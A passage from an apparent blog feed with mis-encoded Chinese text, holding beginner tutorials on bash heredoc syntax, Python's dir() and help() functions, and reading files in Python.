class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$PWD</span></span></span><br><span class="line">/home/violetv/testsh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:22:10]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(basename $PWD)</span>&quot;</span></span></span><br><span class="line">testsh</span><br></pre></td></tr></table></figure></p></li></ol><p>ä¸¾ä¾‹ï¼š<code>$PWD</code>ã€<code>$(whoami)</code>åœ¨ä½¿ç”¨æ²¡æœ‰è¢«å¼•å·åŒ…å›´çš„åˆ†éš”ç¬¦çš„ heaeDocä¸­ï¼Œä¸ä¼šè¢«å½“ä½œå˜é‡è§£æï¼Œåªå½“ä¸€èˆ¬å­—ç¬¦ä¸²ã€‚</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ— å¼•å·åŒ…å›´åˆ†éš”ç¬¦ï¼Œè§£æ</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF</span></span></span><br><span class="line">The current working directory is: $PWD</span><br><span class="line">You are logged in as: $(whoami)</span><br><span class="line">EOF</span><br><span class="line">The current working directory is: /home/violetv/testsh</span><br><span class="line">You are logged in as: violetv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">æœ‰å¼•å·åŒ…å›´åˆ†éš”ç¬¦ï¼Œä¸è§£æ</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">violetv at manjaro in ~/testsh [10:48:56]</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="string">cat &lt;&lt;- &quot;EOF</span><span class="string">&quot;</span></span></span><br><span class="line"><span class="meta prompt_">heredocd&gt; </span><span class="language-bash"><span class="string">The current working directory is: <span class="variable">$PWD</span></span></span></span><br><span class="line"><span class="meta prompt_">heredocd&gt; </span><span class="language-bash"><span class="string">You are logged in as: <span class="subst">$(whoami)</span></span></span></span><br><span class="line"><span class="meta prompt_">heredocd&gt; </span><span class="language-bash"><span class="string">EOF</span></span></span><br><span class="line">The current working directory is: $PWD</span><br><span class="line">You are logged in as: $(whoami)</span><br></pre></td></tr></table></figure></p></li><li><p>here-documentå—å¯ä»¥åŒ…å«å­—ç¬¦ä¸²ï¼Œå˜é‡ï¼Œå‘½ä»¤å’Œä»»ä½•å…¶ä»–ç±»å‹çš„è¾“å…¥ã€‚</p></li><li><p>æœ€åä¸€è¡Œä»¥åˆ†éš”ç¬¦ç»“å°¾ï¼Œ<strong>åˆ†éš”ç¬¦å‰é¢ä¸å…è®¸æœ‰Whitespace</strong>ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸‹é¢æ¨èå½“éœ€è¦åœ¨ shellç¼–å†™ hereDoc ï¼Œç„¶åå¸Œæœ›ä¸å…¶ä»–ç¼©è¿›å¯¹é½æ—¶ï¼Œä½¿ç”¨ <code>&lt;&lt;-</code>çš„åŸå› ã€‚</p></li><li><p>åœ¨é‡å®šå‘è¿ç®—ç¬¦ <code>&lt;&lt;</code> åé¢åŠ ä¸Šå‡å· <code>-</code>å°†å¯¼è‡´æ‰€æœ‰å‰å¯¼åˆ¶è¡¨ç¬¦è¢«å¿½ç•¥ã€‚ è¿™å¯ä»¥ä½¿ä½ å¯ä»¥åœ¨ shell è„šæœ¬ä¸­ç¼–å†™ hereDocæ—¶ä½¿ç”¨ç¼©è¿›ï¼Œè€Œä¸æŠ¥é”™ã€‚ä½†æ˜¯æ³¨æ„ï¼š<strong>ä¸å…è®¸ä½¿ç”¨å‰å¯¼ Whitespaceå­—ç¬¦(å³ï¼šç¬¬ 5 æ¡è®²çš„åˆ†éš”ç¬¦å‰é¢ä¸å…è®¸æœ‰Whitespace)ï¼Œåªèƒ½ä½¿ç”¨åˆ¶è¡¨ç¬¦ã€‚</strong> å¸¸è§åœºæ™¯ï¼šå¦‚æœåœ¨ shellè¯­å¥æˆ–å¾ªç¯ä¸­ä½¿ç”¨ heredocï¼Œè¯·ä½¿ç”¨ <code>&lt;&lt;-</code>é‡å®šå‘æ“ä½œæ˜¯ä½ çš„ä»£ç ç¼©è¿›æ—¶ä¸æŠ¥é”™ã€‚</p><ol type="1"><li><p>ï¼ˆæ¨èï¼‰ä½¿ç”¨å‡å·ï¼Œç¼©è¿›ç»“å°¾ EOF ä¸æŠ¥é”™</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">test</span></span></span><br><span class="line">if true; then</span><br><span class="line">        cat &lt;&lt;- EOF</span><br><span class="line">        Line with a leading tab</span><br><span class="line">        EOF</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:54:34]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test</span></span><br><span class="line">Line with a leading tab</span><br></pre></td></tr></table></figure></p></li><li><p>ï¼ˆé”™è¯¯ï¼‰ï¼šä¸ä½¿ç”¨å‡å·ï¼Œç¼©è¿›ç»“å°¾ EOFï¼Œ æŠ¥é”™</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:55:11]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">test</span></span></span><br><span class="line">if true; then</span><br><span class="line">        cat &lt;&lt; EOF</span><br><span class="line">        Line with a leading tab</span><br><span class="line">        EOF</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:55:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test</span></span><br><span class="line">./test: line 5: warning: here-document at line 2 delimited by end-of-file (wanted `EOF&#x27;)</span><br><span class="line">./test: line 6: syntax error: unexpected end of file</span><br></pre></td></tr></table></figure></p></li><li><p>ï¼ˆä¸æ¨èï¼‰ä¸ä½¿ç”¨å‡å·ï¼Œä¸ç¼©è¿›ç»“å°¾ EOFï¼Œ ä¸æŠ¥é”™,ä½†æ˜¯æœ‰åˆ¶è¡¨ç¬¦è¾“å‡º</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:57:44]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">test</span></span></span><br><span class="line">if true; then</span><br><span class="line">        cat &lt;&lt; EOF</span><br><span class="line">        Line with a leading tab</span><br><span class="line">EOF</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:57:46]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test</span></span><br><span class="line">        Line with a leading tab</span><br></pre></td></tr></table></figure></p></li><li><p>åˆ†éš”ç¬¦å‰æœ‰å‰å¯¼ whitspace æŠ¥é”™</p></li></ol><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:10:03]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">test</span></span></span><br><span class="line">if true; then</span><br><span class="line">        cat &lt;&lt; EOF</span><br><span class="line">                Line with a leading tab</span><br><span class="line">        EOF</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:10:05]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test</span></span><br><span class="line">./test: line 5: warning: here-document at line 2 delimited by end-of-file (wanted `EOF&#x27;)</span><br><span class="line">./test: line 6: syntax error: unexpected end of file</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="å¸¸è§ä½¿ç”¨">å¸¸è§ä½¿ç”¨</h2><p>Here document å¯ä»¥æ­é…è¿™ç§å‘½ä»¤ä½¿ç”¨ï¼Œè¿™é‡Œåªä»‹ç»æˆ‘å¸¸è§çš„åŠæˆ‘è§è¿‡çš„</p><h3 id="ä½¿ç”¨-cat-è¾“å‡ºå¤šè¡Œ">ä½¿ç”¨ cat è¾“å‡ºå¤šè¡Œ</h3><ol type="1"><li><p>ç»ˆç«¯ä¸­ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:11:45]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF</span></span></span><br><span class="line">The current working directory is $PWD</span><br><span class="line">So Who am I?, you are $(whoami)</span><br><span class="line">EOF</span><br><span class="line">The current working directory is /home/violetv/testsh</span><br><span class="line">So Who am I?, you are violetv</span><br></pre></td></tr></table></figure></p></li><li><p>è„šæœ¬ä¸­</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if true; then</span><br><span class="line">    cat &lt;&lt;- EOF</span><br><span class="line">    Line with a leading tab.</span><br><span class="line">    EOF</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p></li><li><p>é‡å®šå‘åˆ°æ–‡ä»¶</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:27:51]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; test.txt</span></span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash"><span class="string">The current working directory is: $PWD</span></span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash"><span class="string">You are logged in as: $(whoami)</span></span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash"><span class="string">EOF</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:28:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> test.txt</span></span><br><span class="line">The current working directory is: /home/violetv/testsh</span><br><span class="line">You are logged in as: violetv</span><br></pre></td></tr></table></figure></p></li><li><p>pipe heredoc</p><p>é€šè¿‡ç®¡é“ï¼Œä½¿ç”¨ sedã€awkç­‰è¿›è¡Œå¤„ç†ï¼Œç„¶åä¹Ÿå¯ä»¥é‡å®šå‘æˆ–è€…è¿½åŠ åˆ°æ–‡ä»¶ã€‚</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF | sed &#x27;s/e/QAQ/g&#x27;</span></span></span><br><span class="line">pipe heredoc&gt; Hello World</span><br><span class="line">pipe heredoc&gt; Linux Shell is powerful!</span><br><span class="line">pipe heredoc&gt; EOF</span><br><span class="line">HQAQllo World</span><br><span class="line">Linux ShQAQll is powQAQrful!</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="shell-ä½¿ç”¨-python-æ‰§è¡Œè„šæœ¬">shell ä½¿ç”¨ python æ‰§è¡Œè„šæœ¬</h3><p>è¿™ä¸ªä¸å¸¸ç”¨ï¼Œåœ¨ shell è„šæœ¬ä¸­ä½¿ç”¨ heredoc è¾¾åˆ°æ‰§è¡Œ pythonä»£ç çš„ç›®çš„ã€‚shell å¯ä»¥ä½¿ç”¨è¯†åˆ« heredocï¼Œ python ä¸èƒ½è¯†åˆ«ã€‚å› æ­¤ï¼Œä¸èƒ½å†pyhton ä¸­ç›´æ¥ä½¿ç”¨ shellï¼Œéœ€è¦é€šè¿‡ä¸€èˆ¬æ“ä½œï¼Œå¦‚ï¼šos æ¨¡å—ï¼Œsubprocessæ¨¡å—ç­‰ã€‚</p><p>ä¸€èˆ¬æˆ‘ä»¬éƒ½æ˜¯ shell å’Œ expect ç›¸äº’ä½¿ç”¨ï¼Œä¸è¿‡ expect æˆ‘è¿˜æ²¡å­¦ emm</p><p>heredoc æ­é… python å‘½ä»¤æ‰§è¡Œ:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/sh</span></span><br><span class="line">if ping -c1 $1 &amp;&gt;/dev/null; then</span><br><span class="line">    python &lt;&lt;-EOF</span><br><span class="line">        print(&quot;ip is up&quot;)</span><br><span class="line">    EOF</span><br><span class="line">else</span><br><span class="line">    /usr/bin/python &lt;&lt;-EOF</span><br><span class="line">        print(&quot;ip is down&quot;)</span><br><span class="line">    EOF</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://linuxize.com/post/bash-heredoc/#disqus_thread">BashHeredoc</a></p>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python å¸®åŠ©æ–‡æ¡£</title>
      <link href="/blog/2020/06/27/programming/python/1.basic/12.help_doc/"/>
      <url>/blog/2020/06/27/programming/python/1.basic/12.help_doc/</url>
      
        <content type="html"><![CDATA[<h2 id="dir-å‡½æ•°">dir å‡½æ•°</h2><p>dir()å‡½æ•°ä¸å¸¦å‚æ•°æ—¶ï¼Œè¿”å›<strong>å½“å‰èŒƒå›´å†…çš„å˜é‡ã€æ–¹æ³•å’Œå®šä¹‰çš„ç±»å‹åˆ—è¡¨</strong>ï¼›å¸¦å‚æ•°æ—¶ï¼Œè¿”å›<strong>å‚æ•°çš„å±æ€§ã€æ–¹æ³•åˆ—è¡¨</strong>ã€‚å¦‚æœå‚æ•°åŒ…å«æ–¹æ³•<code>__dir__()</code>ï¼Œè¯¥æ–¹æ³•å°†è¢«è°ƒç”¨ã€‚å¦‚æœå‚æ•°ä¸åŒ…å«<code>__dir__()</code>ï¼Œè¯¥æ–¹æ³•å°†æœ€å¤§é™åº¦åœ°æ”¶é›†å‚æ•°ä¿¡æ¯ã€‚</p><p>ç”¨æ³•ï¼š <code>dir([object])</code></p><p>å†…ç½®æ¨¡å—ç›´æ¥ä¼ å‚è¿› dir() å³å¯ï¼Œå¤–éƒ¨æ¨¡å—ï¼Œå¦‚ï¼štimeï¼Œrequestsç­‰éœ€è¦å…ˆå¯¼å…¥ï¼ˆimportï¼‰ï¼Œç„¶åå†è¿›è¡Œå¯¹åº”æ­¥éª¤ã€‚</p><p>ç¤ºä¾‹ï¼š</p><ol type="1"><li><p>å†…ç½®æ¨¡å—ç›´æ¥è°ƒç”¨ dir() å‚æ•°ä¸ºç±»å‹åã€ç©ºç±»å‹ã€ç±»å‹å®ä¾‹ç­‰å‡å¯ã€‚æŸ¥çœ‹ str æ¨¡å—ï¼š<code>dir(str)ï¼Œ dir("")</code>æŸ¥çœ‹å­—å…¸æ¨¡å—ï¼š<code>dir(dict())ã€dir(&#123;&#125;)</code>æŸ¥çœ‹é›†åˆæ¨¡å—ï¼š<code>dir(set())</code></p></li><li><p>å¤–éƒ¨æ¨¡å—å…ˆ import å¯¼å…¥ï¼Œ ç„¶åå†æŸ¥çœ‹ã€‚ ä¾‹å¦‚ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">dir</span>(time)</span><br></pre></td></tr></table></figure></p></li></ol><p><strong>å¸¸ç”¨æ¥æŸ¥çœ‹å±æ€§ã€æ–¹æ³•åˆ—è¡¨</strong>ï¼Œä¸€èˆ¬ç”¨åœ¨è®°ä¸æ¸…ï¼ˆæˆ–è€…æƒ³æŸ¥çœ‹ï¼‰æŸäº›æ¨¡å—çš„å±æ€§æˆ–è€…æ–¹æ³•å­˜åœ¨ä¸å¦æ—¶ã€‚</p><p>ä½†æ˜¯è¿™ä¸ªåˆ—è¡¨åªæœ‰ç®€ç•¥çš„åå­—ï¼Œæ²¡æœ‰å‚æ•°ç”¨æ³•ç­‰è¯¦ç»†ä»‹ç»ï¼Œéœ€è¦ç”¨åé¢çš„<code>help</code> å‡½æ•°æˆ–è€… <code>__doc__</code> å±æ€§æŸ¥çœ‹ä½¿ç”¨å¸®åŠ©ã€‚</p><h2 id="help-å‡½æ•°">help å‡½æ•°</h2><p>æŸ¥çœ‹è¯¦ç»†çš„æ¨¡å—ä»‹ç»ã€ç±»ã€æ–¹æ³•çš„ä½¿ç”¨ç­‰ã€‚</p><ol type="1"><li><p>å¯¼å…¥åŒ…ï¼ˆå¦‚æœä¸æ˜¯å†…ç½®æ¨¡å—çš„è¯ï¼‰</p></li><li><p>é€šè¿‡ help å‘½ä»¤æŸ¥çœ‹å‡½æ•°ï¼ˆæ³¨æ„ï¼šè¦ä»æ¨¡å—å†™èµ·ï¼‰æŸ¥çœ‹æ¨¡å—ä¿¡æ¯ï¼š<code>help(module_name)</code>æŸ¥çœ‹æ¨¡å—ä¸‹ç‰¹å®šå‡½æ•°ä¿¡æ¯ï¼š<code>help(module_name.func_name)</code></p></li><li><p>å¦‚æœåªåœ¨ python console é‡Œé¢è¾“å…¥ <code>help()</code>,è¿›å…¥å¸®åŠ©æ–‡æ¡£çš„äº¤äº’æ¨¡å¼(<code>ctrl+c</code> é€€å‡º)ã€‚</p></li></ol><p>ä¾‹å¦‚ï¼š</p><p>æŸ¥çœ‹ requests çš„ session æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: <span class="keyword">import</span> requests</span><br><span class="line">In [<span class="number">18</span>]: <span class="built_in">help</span>(requests.session)</span><br><span class="line">In [<span class="number">20</span>]: <span class="built_in">help</span>(requests.sessions.Session)</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ subproccess çš„ run æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">21</span>]: <span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: <span class="built_in">help</span>(subprocess.run)</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ str çš„ count å‡½æ•°ä½¿ç”¨ï¼š<code>help(str.count)</code></p><h2 id="doc__-å±æ€§"><code>__doc__</code> å±æ€§</h2><p>æˆ‘çŒœ <code>help()</code>åº”è¯¥å°±æ˜¯ä»è¯¥å±æ€§æå–çš„æ–‡æ¡£é‚£ä¸ªï¼ŒäºŒè€…å†…å®¹å·®åˆ«ä¸å¤§ï¼Œæ‰€ä»¥ç”¨<code>help()</code> å°±å¤Ÿäº†</p><p>ä½¿ç”¨ç¤ºä¾‹ï¼š <code>str.count.__doc__</code></p><p>æ­¤å¤–ï¼Œè¿˜æœ‰ä¸ª pydoc å®˜æ–¹å·¥å…·å’Œä»¥ä¸Šå·¥å…·åŸºæœ¬æ— å·®ï¼Œä¸å­¦äº†ï¼Œå“ˆå“ˆã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://www.runoob.com/python/python-func-dir.html">Pythondir() å‡½æ•°</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python with è¯­å¥æ“ä½œæ–‡ä»¶(è½¬)</title>
      <link href="/blog/2020/06/22/programming/python/2.object-oriented/file_with/"/>
      <url>/blog/2020/06/22/programming/python/2.object-oriented/file_with/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">introduction</h2><p>åœ¨ç£ç›˜ä¸Šè¯»å†™æ–‡ä»¶çš„åŠŸèƒ½éƒ½æ˜¯ç”±æ“ä½œç³»ç»Ÿæä¾›çš„ï¼Œç°ä»£æ“ä½œç³»ç»Ÿä¸å…è®¸æ™®é€šçš„ç¨‹åºç›´æ¥æ“ä½œç£ç›˜ï¼Œæ‰€ä»¥ï¼Œè¯»å†™æ–‡ä»¶å°±æ˜¯è¯·æ±‚æ“ä½œç³»ç»Ÿæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼ˆé€šå¸¸ç§°ä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼Œç„¶åï¼Œé€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„æ¥å£ä»è¿™ä¸ªæ–‡ä»¶å¯¹è±¡ä¸­è¯»å–æ•°æ®ï¼ˆè¯»æ–‡ä»¶ï¼‰ï¼Œæˆ–è€…æŠŠæ•°æ®å†™å…¥è¿™ä¸ªæ–‡ä»¶å¯¹è±¡ï¼ˆå†™æ–‡ä»¶ï¼‰ã€‚</p><p>Python æä¾›äº† with è¯­å¥æ¥ç®¡ç†èµ„æºå…³é—­ã€‚æ¯”å¦‚å¯ä»¥æŠŠæ‰“å¼€çš„æ–‡ä»¶æ”¾åœ¨ withè¯­å¥ä¸­ï¼Œè¿™æ · with è¯­å¥å°±ä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨å…³é—­æ–‡ä»¶ã€‚</p><h2 id="è¯»æ–‡ä»¶">è¯»æ–‡ä»¶</h2><p>è¦ä»¥è¯»æ–‡ä»¶çš„æ¨¡å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼Œä½¿ç”¨ Python å†…ç½®çš„<code>open()</code> å‡½æ•°ï¼Œä¼ å…¥æ–‡ä»¶åå’Œæ ‡ç¤ºç¬¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ ‡ç¤ºç¬¦ 'r' è¡¨ç¤ºè¯»ï¼Œè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸåœ°æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ã€‚</p><p>å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œ<code>open()</code>å‡½æ•°å°±ä¼šæŠ›å‡ºä¸€ä¸ª<code>IOError</code>çš„é”™è¯¯ï¼Œå¹¶ä¸”ç»™å‡ºé”™è¯¯ç å’Œè¯¦ç»†çš„ä¿¡æ¯å‘Šè¯‰ä½ æ–‡ä»¶ä¸å­˜åœ¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=<span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/notfound.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt; FileNotFoundError: [Errno <span class="number">2</span>] No such file <span class="keyword">or</span> directory: <span class="string">&#x27;/Users/michael/notfound.txt&#x27;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ–‡ä»¶æ‰“å¼€æˆåŠŸï¼Œæ¥ä¸‹æ¥ï¼Œè°ƒç”¨ <code>read()</code>æ–¹æ³•å¯ä»¥ä¸€æ¬¡è¯»å–æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ï¼ŒPythonæŠŠå†…å®¹è¯»åˆ°å†…å­˜ï¼Œ<strong>ç”¨ä¸€ä¸ª<code>str</code>å¯¹è±¡è¡¨ç¤º</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br><span class="line"><span class="string">&#x27;Hello, world!&#x27;</span></span><br></pre></td></tr></table></figure><p>æœ€åä¸€æ­¥æ˜¯è°ƒç”¨ <code>close()</code>æ–¹æ³•å…³é—­æ–‡ä»¶ã€‚æ–‡ä»¶ä½¿ç”¨å®Œæ¯•åå¿…é¡»å…³é—­ï¼Œå› ä¸ºæ–‡ä»¶å¯¹è±¡ä¼šå ç”¨æ“ä½œç³»ç»Ÿçš„èµ„æºï¼Œå¹¶ä¸”æ“ä½œç³»ç»ŸåŒä¸€æ—¶é—´èƒ½æ‰“å¼€çš„æ–‡ä»¶æ•°é‡ä¹Ÿæ˜¯æœ‰é™çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure><p>ç”±äºæ–‡ä»¶è¯»å†™æ—¶éƒ½æœ‰å¯èƒ½äº§ç”Ÿ <code>IOError</code>ï¼Œä¸€æ—¦å‡ºé”™ï¼Œåé¢çš„<code>f.close()</code>å°±ä¸ä¼šè°ƒç”¨ã€‚æ‰€ä»¥ï¼Œä¸ºäº†ä¿è¯æ— è®ºæ˜¯å¦å‡ºé”™éƒ½èƒ½æ­£ç¡®åœ°å…³é—­æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>try ... finally</code>æ¥å®ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        